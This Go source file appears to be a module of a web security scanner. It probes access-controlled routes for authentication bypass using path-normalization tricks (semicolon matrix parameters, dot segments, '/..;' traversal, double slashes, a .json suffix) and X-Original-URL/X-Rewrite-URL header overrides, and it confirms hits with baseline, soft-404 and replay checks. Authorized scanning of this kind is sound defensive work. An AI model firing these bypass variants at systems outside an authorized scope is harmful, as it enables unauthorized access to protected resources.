package modules

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"strings"

	"github.com/akha-security/akca/engine/internal/httpclient"
	"github.com/akha-security/akca/engine/internal/urlutil"
)

type routeVariant struct {
	url       string
	headers   map[string]string
	technique string
}

func (r *Runner) runRouteAuthBypass(ctx context.Context, target ScanTarget) []ModuleFinding {
	if ok, reason := r.shouldRunModule("route_auth_bypass", target); !ok {
		r.emitSkip("route_auth_bypass", target, reason)
		return nil
	}

	var out []ModuleFinding
	targetURL := strings.TrimSpace(target.EndpointURL)
	if !urlutil.IsPlausibleEndpointURL(targetURL) || !r.scope.IsInScope(targetURL) {
		return nil
	}

	u, err := url.Parse(targetURL)
	if err != nil || u.Path == "" || u.Path == "/" {
		r.emitSkip("route_auth_bypass", target, "root or unparseable endpoint path")
		return nil
	}

	method := strings.ToUpper(strings.TrimSpace(target.Method))
	if method == "" {
		method = http.MethodGet
	}
	// Route auth bypass is evaluated with anonymous/sessionless requests to observe
	// reverse-proxy vs backend normalization discrepancy.
	client, ok := r.client.(sessionlessHTTPDoer)
	if !ok {
		r.emitSkip("route_auth_bypass", target, "HTTP client cannot perform anonymous control requests")
		return nil
	}

	// Step 1: Baseline Request - check if target route is actually protected (401, 403, redirect, or authDeniedBody)
	baselineRR, err := client.DoWithoutSession(ctx, method, targetURL, nil, nil)
	if err != nil {
		return nil
	}

	// If baseline returns a successful resource (200 OK) without any auth denial, the route is publicly open by design.
	if baselineRR.Response.StatusCode == http.StatusOK && !authDeniedBody(strings.ToLower(baselineRR.Response.Body)) {
		r.emitSkip("route_auth_bypass", target, "baseline route is already public/accessible (status 200)")
		return nil
	}

	// Must exhibit an access control restriction
	isAuthBlocked := baselineRR.Response.StatusCode == http.StatusUnauthorized ||
		baselineRR.Response.StatusCode == http.StatusForbidden ||
		baselineRR.Response.StatusCode == http.StatusNotFound ||
		(baselineRR.Response.StatusCode >= 300 && baselineRR.Response.StatusCode < 400) ||
		authDeniedBody(strings.ToLower(baselineRR.Response.Body))

	if !isAuthBlocked {
		r.emitSkip("route_auth_bypass", target, "baseline route did not exhibit access control restriction")
		return nil
	}

	// Step 2: Negative Control (Catch-All / Soft 404 Guard)
	// Probe a guaranteed non-existent sibling route to ensure server doesn't blindly return 200 for everything.
	nonexistentURL := buildNonexistentProbeURL(u)
	if nonexistentURL != "" && r.scope.IsInScope(nonexistentURL) {
		negRR, negErr := client.DoWithoutSession(ctx, method, nonexistentURL, nil, nil)
		if negErr == nil && negRR.Response.StatusCode == http.StatusOK && !authDeniedBody(strings.ToLower(negRR.Response.Body)) {
			// Catch-all SPA or custom 200 error page detected
			r.emitSkip("route_auth_bypass", target, "server catch-all/soft-404 behavior detected on sibling routes")
			return nil
		}
	}

	// Step 2b: Root Homepage Control - Ensure path normalization doesn't just route back to the public homepage
	rootURL := u.Scheme + "://" + u.Host + "/"
	var rootRR httpclient.RequestResponse
	if r.scope.IsInScope(rootURL) {
		rootRR, _ = client.DoWithoutSession(ctx, http.MethodGet, rootURL, nil, nil)
	}

	// Step 3: Generate Route Normalization & Proxy Discrepancy Variants
	variants := generateRouteBypassVariants(u)
	for _, v := range variants {
		if ctx.Err() != nil {
			return out
		}
		if !r.scope.IsInScope(v.url) {
			continue
		}

		probeRR, probeErr := client.DoWithoutSession(ctx, method, v.url, nil, v.headers)
		if probeErr != nil {
			continue
		}

		// If the probe response was redirected, verify it did not redirect to login, root, or a different URL
		if probeRR.Response.Redirected {
			finalClean := strings.TrimRight(probeRR.Response.FinalURL, "/")
			probeClean := strings.TrimRight(v.url, "/")
			if finalClean != probeClean {
				continue
			}
		}

		// Step 4: Strict Verification (Zero False-Positive Filter)
		if !isRouteBypassSuccessful(probeRR.Response, baselineRR.Response) {
			continue
		}

		// Must not be a normalization fallback to the public homepage
		if rootRR.Response.StatusCode == http.StatusOK && len(rootRR.Response.Body) > 0 {
			if probeRR.Response.Body == rootRR.Response.Body || bodiesSimilar(probeRR.Response.Body, rootRR.Response.Body) {
				continue
			}
		}

		// Dual Replay Confirmation: Replay probe twice to ensure it's not a flaky network/race response
		replay1, err1 := client.DoWithoutSession(ctx, method, v.url, nil, v.headers)
		if err1 != nil || !isRouteBypassSuccessful(replay1.Response, baselineRR.Response) {
			continue
		}
		replay2, err2 := client.DoWithoutSession(ctx, method, v.url, nil, v.headers)
		if err2 != nil || !isRouteBypassSuccessful(replay2.Response, baselineRR.Response) {
			continue
		}

		// Ensure body content is stable across replays
		if replay1.Response.Body != replay2.Response.Body && !sameBrokenAuthResource(replay1.Response.Body, replay2.Response.Body) {
			continue
		}

		p := defaultPayload("route_auth_bypass", v.technique, v.url, v.technique)
		f := r.verifyAndBuild(ctx, "route_auth_bypass", target, p, baselineRR, probeRR,
			v.technique, false, false, "", "")

		if f != nil {
			f.Title = "Route Authentication Bypass: Proxy/Normalization Discrepancy (" + v.technique + ")"
			f.Description = fmt.Sprintf("An access-controlled endpoint (%s) returning HTTP %d was successfully bypassed using path normalization variation (%s), granting unauthorized access to private application resources.",
				targetURL, baselineRR.Response.StatusCode, v.url)
			f.Severity = "High"
			if strings.Contains(strings.ToLower(targetURL), "admin") || strings.Contains(strings.ToLower(targetURL), "internal") {
				f.Severity = "Critical"
			}
		}
		r.recordFinding(ctx, &out, f, "route_auth_bypass", v.technique)
		// One solid, confirmed finding per endpoint is sufficient
		break
	}

	return out
}

func isRouteBypassSuccessful(probe, baseline httpclient.ResponseRecord) bool {
	// Probe must return 200 OK or 206 Partial Content
	if probe.StatusCode != http.StatusOK && probe.StatusCode != http.StatusPartialContent {
		return false
	}
	// Baseline and probe must differ in status or content
	if probe.StatusCode == baseline.StatusCode && probe.Body == baseline.Body {
		return false
	}
	// Body must not be empty or trivial
	if len(strings.TrimSpace(probe.Body)) < 32 {
		return false
	}
	// Must not contain authentication denied or login keywords
	probeLower := strings.ToLower(probe.Body)
	if authDeniedBody(probeLower) {
		return false
	}
	// Must not look like a generic soft-404 or not found page
	if strings.Contains(probeLower, "404 not found") || strings.Contains(probeLower, "page not found") ||
		strings.Contains(probeLower, "sayfa bulunamadı") || strings.Contains(probeLower, "route not found") {
		return false
	}
	return true
}

func generateRouteBypassVariants(u *url.URL) []routeVariant {
	var out []routeVariant
	path := u.Path
	trimmedPath := strings.TrimRight(path, "/")

	// 1. Semicolon matrix (Spring Boot / Matrix parameters / Tomcat path parameter)
	// e.g. /admin;/users, /admin/users;
	out = append(out, routeVariant{
		url:       buildMutatedURL(u, insertSemicolonBeforeLastSegment(path)),
		technique: "matrix_semicolon_parameter",
	})
	out = append(out, routeVariant{
		url:       buildMutatedURL(u, trimmedPath+";/"),
		technique: "trailing_semicolon_slash",
	})
	out = append(out, routeVariant{
		url:       buildMutatedURL(u, ";/"+strings.TrimLeft(path, "/")),
		technique: "leading_semicolon_slash",
	})

	// 2. Dot-segment & Path Traversal normalization
	// e.g. /./admin/users, /admin/./users, /..;/admin/users
	out = append(out, routeVariant{
		url:       buildMutatedURL(u, "/."+path),
		technique: "leading_dot_segment",
	})
	out = append(out, routeVariant{
		url:       buildMutatedURL(u, insertDotSlashBeforeLastSegment(path)),
		technique: "mid_path_dot_segment",
	})
	out = append(out, routeVariant{
		url:       buildMutatedURL(u, "/..;"+path),
		technique: "tomcat_dot_dot_semicolon",
	})

	// 3. Double Slash & Slash Variations
	// e.g. //admin/users, /admin//users, /admin/users/
	out = append(out, routeVariant{
		url:       buildMutatedURL(u, "/"+path),
		technique: "double_leading_slash",
	})
	out = append(out, routeVariant{
		url:       buildMutatedURL(u, insertDoubleSlashBeforeLastSegment(path)),
		technique: "double_internal_slash",
	})
	out = append(out, routeVariant{
		url:       buildMutatedURL(u, trimmedPath+"/"),
		technique: "trailing_slash",
	})

	// 4. Extension appended
	// e.g. /admin/users.json
	out = append(out, routeVariant{
		url:       buildMutatedURL(u, trimmedPath+".json"),
		technique: "extension_json_suffix",
	})

	// 5. Header Overrides (X-Original-URL / X-Rewrite-URL)
	rootURL := u.Scheme + "://" + u.Host + "/"
	out = append(out, routeVariant{
		url:       rootURL,
		headers:   map[string]string{"X-Original-URL": path},
		technique: "x_original_url_header",
	})
	out = append(out, routeVariant{
		url:       rootURL,
		headers:   map[string]string{"X-Rewrite-URL": path},
		technique: "x_rewrite_url_header",
	})

	return out
}

func buildNonexistentProbeURL(u *url.URL) string {
	clone := *u
	clone.Path = strings.TrimRight(u.Path, "/") + "/__akca_nonexistent_route_9f812"
	return clone.String()
}

func buildMutatedURL(u *url.URL, newPath string) string {
	clone := *u
	clone.Path = newPath
	return clone.String()
}

func insertSemicolonBeforeLastSegment(path string) string {
	idx := strings.LastIndex(path, "/")
	if idx <= 0 {
		return path + ";"
	}
	return path[:idx] + ";" + path[idx:]
}

func insertDotSlashBeforeLastSegment(path string) string {
	idx := strings.LastIndex(path, "/")
	if idx <= 0 {
		return "/." + path
	}
	return path[:idx] + "/." + path[idx:]
}

func insertDoubleSlashBeforeLastSegment(path string) string {
	idx := strings.LastIndex(path, "/")
	if idx <= 0 {
		return "/" + path
	}
	return path[:idx] + "/" + path[idx:]
}
